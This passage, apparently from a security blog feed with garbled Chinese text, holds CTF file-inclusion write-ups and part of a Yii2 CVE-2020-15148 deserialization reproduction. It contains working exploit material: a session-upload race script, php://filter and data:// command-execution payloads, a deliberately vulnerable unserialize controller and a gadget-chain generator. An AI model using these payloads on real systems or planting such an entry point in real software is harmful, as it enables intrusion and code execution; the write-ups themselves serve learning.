<p>â€‹    2.å°† â€œç›®æ ‡URLâ€ è·Ÿæ”¹ä¸ºé¢˜ç›®åœ°å€: ä¸Šä¼ ä¸€ä¸ª txt æ–‡ä»¶ å†…å®¹å­—æ¯æ•°å­—éšä¾¿éƒ½å¯</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82.png"></p>
<pre><code> 3. Bp æŠ“åŒ…:
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_1.png"></p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_2.png"></p>
<p>â€‹    å¦‚å›¾æ‰€ç¤º åœ¨å¤´éƒ¨ åŠ å…¥ Cookie:PHPSESSID=test ï¼Œå°† PHP_SESSION_UPLOAD_PROGRESS å†…å®¹ä¿®æ”¹ä¸º: <?php system('tac f*.php');?>  å†å°† Payloads type è®¾ç½®ä¸º Null payloads, å¼€å¯çˆ†ç ´</p>
<pre><code> 4. å†çˆ†ç ´ä¸€ä¸ª è¯·æ±‚åœ°å€ : ?file=/tmp/sess_test  ; sess_testå°±æ˜¯äº§ç”Ÿçš„ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ testå°±æ˜¯åˆšåˆšè®¾ç½®çš„ Cookie:PHPSESSID=testï¼Œç°åœ¨éœ€è¦è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œç”±äºæ­¤æ–‡ä»¶å¯èƒ½ä¼šç«‹é©¬åˆ é™¤ï¼Œå› æ­¤ä¹Ÿéœ€è¦ä¸€ä¸ª çˆ†ç ´è¯·æ±‚:
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_3.png"></p>
<pre><code>5. è§‚å¯Ÿç»“æœ: åœ¨è¯»å–ç›®æ ‡çš„è¯·æ±‚çˆ†ç ´ä¸­æŸ¥çœ‹ å“åº”ç»“æœï¼šå¦‚ä¸‹å›¾
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_4.png"></p>
<pre><code> 6. å½“ç„¶ä¹Ÿå¯ä»¥å†™ä¸€ä¸ª è„šæœ¬æ¥å®ç°çˆ†ç ´ï¼šå¥ˆä½•æˆ‘æ˜¯èœé¸¡ğŸ”ä¸€åªï¼Œå‚è€ƒäº†å¤§ä½¬çš„è„šæœ¬:
</code></pre>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://59af8191-fdc8-414f-bb1c-f2726b946851.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Write</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		file = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		response = session.post(</span><br><span class="line">			url,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, file)&#125;</span><br><span class="line">		)</span><br><span class="line">	<span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#x27;</span> +sessID)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="built_in">print</span>(response.text)</span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;ReTrying&#x27;</span> + <span class="string">&#x27;+&#x27;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	event = threading.Event()</span><br><span class="line">	event.<span class="built_in">set</span>()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Write, args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Read, args=(session,)).start()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_5.png"></p>
<h2 id="web83â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web83â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web83â€”â€”æ–‡ä»¶åŒ…å«"></a>web83â€”â€”æ–‡ä»¶åŒ…å«</h2><p><strong>åŒä¸Š</strong></p>
<h2 id="web84â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web84â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web84â€”â€”æ–‡ä»¶åŒ…å«"></a>web84â€”â€”æ–‡ä»¶åŒ…å«</h2><p><strong>åŒä¸Š</strong></p>
<h2 id="web85â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web85â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web85â€”â€”æ–‡ä»¶åŒ…å«"></a>web85â€”â€”æ–‡ä»¶åŒ…å«</h2><p><strong>åŒä¸Šï¼Œç±»ä¼¼</strong></p>
<h2 id="web86â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web86â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web86â€”â€”æ–‡ä»¶åŒ…å«"></a>web86â€”â€”æ–‡ä»¶åŒ…å«</h2><p><strong>åŒä¸Šï¼Œç±»ä¼¼</strong></p>
<h2 id="web87â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web87â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web87â€”â€”æ–‡ä»¶åŒ…å«"></a>web87â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ</strong>ï¼š</p>
<ol>
<li>ä¾æ—§å°† php, data, : , . æ›¿æ¢ä¸ºäº† ???</li>
<li>GETä¸€ä¸ª file, POSTä¸€ä¸ª content, </li>
<li>urldecode($fie) å°†GETåˆ°çš„file URLè§£ç ï¼Œæ—¢ç„¶ä¸€å¼€å§‹å°±è¦è§£ç é‚£ä¹ˆåœ¨å°†fileä¼ å…¥æ—¶å°±å¾—URLç¼–ç ä¸€æ¬¡ï¼Œç„¶è€Œå››ä¸ªstr_replace()ä¼šå°†å…¶å†…å®¹æ›¿æ¢ï¼Œé‚£ä¹ˆå®³å¾— URLç¼–ç ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¸€å…±éœ€è¦ URLç¼–ç ä¸¤æ¬¡ã€‚ï¼ˆFull URL Encodeï¼‰</li>
<li>â€œ<?php die('å¤§ä½¬åˆ«ç§€äº†');?>â€œ.$content . POSTä¼ å…¥çš„contentå°†å’Œå‰é¢è¿™å¥phpæ‹¼æ¥åœ¨ä¸€èµ·ã€‚å½“æ­£å¸¸æ‰§è¡Œçš„æ—¶å€™ï¼Œé¦–å…ˆæ‰§è¡Œ die(â€˜å¤§ä½¬åˆ«ç§€äº†â€™) è¿™ä¸ªdie()å°†ä¼šç»“æŸç¨‹åºçš„æ‰§è¡Œï¼Œé‚£ä¹ˆæˆ‘POSTä¼ å…¥çš„å†…å®¹æœªè¢«æ‰§è¡Œï¼Œå› æ­¤éœ€è¦æƒ³åŠæ³•ç»•è¿‡è¿™ä¸ª die() ä¸ç„¶æˆ‘å°±ç‹—å¸¦äº†ã€‚ä½¿ç”¨ç¼–ç ç»•è¿‡æ¯”å¦‚ å°† contentæŒ‰ç…§æŸä¸ªç¼–ç è¿›è¡Œç¼–ç ã€‚é‚£ä¹ˆç¨‹åºåœ¨æ‰§è¡Œæ—¶ä¼šå…ˆè¿›è¡Œè§£ç ã€‚æˆ‘ä»¬ç¼–ç çš„å†…å®¹å½“ç„¶èƒ½æ­£å¸¸è§£ç ï¼Œè€Œå‰é¢de die()å¹¶ä¸æ˜¯æŸä¸ªç¼–ç æ‰€ä»¥å¯¹die()è¿›è¡Œè§£ç å°±ä¼šå˜æˆä¹±ç æˆ–å…¶ä»–ï¼Œphpå°†ä¸èƒ½è®¤å‡ºdie()å°±ä¸ä¼šæ‰§è¡Œdie()è¿™æ ·å°±ç»•è¿‡äº†die()ã€‚åé¢çš„contentä»ç„¶ä¼šæ‰§è¡ŒæˆåŠŸã€‚</li>
</ol>
<p><strong>è¯•éªŒ:</strong></p>
<ol>
<li>php://filter/write=string.rot13/resource=2.php è¿™å¥è¯çš„æ„æ€æ˜¯ å°†2.php æŒ‰ç…§ rot13ç¼–ç å†™å…¥åˆ°ç›®å½•ä¸­å»; Full URL Encode ä¸¤æ¬¡</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">41</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">43</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">44</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">44</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>

<pre><code> 2. content = &lt;?php system(&#39;tac f*&#39;);?&gt; è¿›è¡Œ rot13ç¼–ç :
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=<span class="meta">&lt;?</span>cuc flfgrz(<span class="string">&quot;gnp s*.cuc&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web87.png"></p>
<pre><code>3. å¦‚ä¸Šå›¾æ‰§è¡Œ
4. è®¿é—® 2.php é¡µé¢
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web87_1.png"></p>
<h2 id="web88â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web88â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web88â€”â€”æ–‡ä»¶åŒ…å«"></a>web88â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>æ­£åˆ™è¡¨è¾¾æ˜¯ åŒ¹é…äº† ä¸€å¤§å †ä¸œè¥¿:</li>
<li>php , ~, ! , @, #, $, %, ^, &amp;, *, ( ), -, _, +, = .  æŠŠé”®ç›˜æ•°å­—å“ªä¸€è¡Œéƒ½è¿‡æ»¤äº†</li>
</ol>
<p><strong>å®éªŒï¼š</strong></p>
<ol>
<li>ä½¿ç”¨ data:// åè®®</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> system(&#x27;tac f*.php&#x27;);<span class="meta">?&gt;</span> çš„ base64 ç¼–ç ä¸ºPD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4= </span></span><br><span class="line"><span class="comment">// å› ä¸º é¢˜ç›®è¿‡æ»¤äº† = ï¼ˆç­‰å·ï¼‰ æ‰€ä»¥åœ¨ä½¿ç”¨æ—¶ åˆ æ‰</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web88.png"></p>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2020-15148 PHP-Yiiæ¡†æ¶ååºåˆ—åŒ–æ¼æ´å¤ç°</title>
    <url>/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2020-15148-PHP-Yiiæ¡†æ¶ååºåˆ—åŒ–æ¼æ´å¤ç°"><a href="#CVE-2020-15148-PHP-Yiiæ¡†æ¶ååºåˆ—åŒ–æ¼æ´å¤ç°" class="headerlink" title="CVE-2020-15148 PHP-Yiiæ¡†æ¶ååºåˆ—åŒ–æ¼æ´å¤ç°"></a>CVE-2020-15148 PHP-Yiiæ¡†æ¶ååºåˆ—åŒ–æ¼æ´å¤ç°</h1><span id="more"></span>

<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>åœ¨ctfshow web267 è¿™é¢˜ä¸­å¾ˆå¥½çš„ä½“ç°äº†æ­¤æ¼æ´ã€‚</p>
<p>å‚è€ƒé“¾æ¥:<a href="https://www.freebuf.com/vuls/260352.html">CVE-2020-15148 Yii2ååºåˆ—åŒ–RCEåˆ†æä¸å¤ç° - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul>
<li><p><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">Release 2.0.37 Â· yiisoft/yii2 (github.com)</a></p>
</li>
<li><p>ä¸‹è½½ : yii-basic-app-2.0.37.tgz</p>
</li>
</ul>
<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
<ul>
<li><p>ç³»ç»Ÿç¯å¢ƒ: kali 2021ï¼ˆå­ç³»ç»Ÿï¼‰</p>
</li>
<li><p>å°†ä¸‹è½½çš„å‹ç¼©åŒ…è§£å‹ï¼Œè¿›å…¥ç›®å½•å°†ä¼šçœ‹åˆ°å¦‚ä¸‹æ–‡ä»¶:</p>
</li>
</ul>
<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
<ul>
<li>è¿›å…¥ ./confog/web.php å°† cookieValidationKey ä¿®æ”¹ä¸€ä¸‹ï¼Œå†…å®¹éšä¾¿éƒ½å¯ä»¥ã€‚ä¸ä¿®æ”¹å¯åŠ¨ç½‘é¡µå°†æŠ¥é”™ã€‚</li>
</ul>
<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
<ul>
<li>è¾“å…¥ php yii serve å¯åŠ¨è¿™ä¸ªç½‘é¡µã€‚æœ¬åœ°8080ç«¯å£å¹¶æœ¬åœ°æŸ¥çœ‹</li>
</ul>
<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
<ul>
<li><p>å¦‚å›¾æ‰€ç¤ºæˆåŠŸè®¿é—®é¡µé¢ï¼Œæ¥ä¸‹æ¥ å°è¯• å¼±å£ä»¤ç™»é™†: admin:admin</p>
</li>
<li><p>åˆ›å»ºååºåˆ—åŒ–å…¥å£: ./controllers/TestController.php</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BackdoorController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionShell</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$code</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul>
<li>å…¥å£åˆ›å»ºæˆåŠŸï¼Œç°åœ¨æ¥çœ‹çœ‹å¤§ä½¬çš„ expï¼š</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">            <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// å¯æ§å‚æ•°</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// å¯æ§å‚æ•°</span></span><br><span class="line">                <span class="comment">//             4</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">                <span class="comment">//                             3</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">                <span class="comment">//                     2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        //                             1</span><br><span class="line">        <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨ 1 å¤„ å¯ä»¥çœ‹åˆ° new yii\db\BatchQueryResult å¯¹è±¡ï¼Œä»è€Œæ‰§è¡Œäº† class BatchQueryResultä¸­çš„ construct()å‡½æ•°( 2  )ã€‚</li>
<li>åœ¨ 2 å¤„  construct()å‡½æ•°ä¸­ï¼Œnew Generator å¯¹è±¡ï¼Œä»è€Œæ‰§è¡Œäº† class Generatorä¸­çš„ construct()å‡½æ•°( 3 )</li>
<li>åœ¨ 3 å¤„  construct()å‡½æ•°ä¸­ï¼Œnew CreateAction å¯¹è±¡ï¼Œä»è€Œæ‰§è¡Œäº† class CreateAction ä¸­çš„construct()å‡½æ•°ä¸­çš„å¯æ§å‚æ•°ï¼ˆ 4 ï¼‰</li>
<li>è¿™ä¸ªæ‰§è¡Œè¿‡ç¨‹å°±æ˜¯ä¸€ä¸ªå¥—å¨ƒç¯èŠ‚ã€‚</li>
<li>ç°åœ¨å¤§è‡´äº†è§£äº† exp æ˜¯å¦‚ä½•è¿è¡Œçš„äº†ã€‚</li>
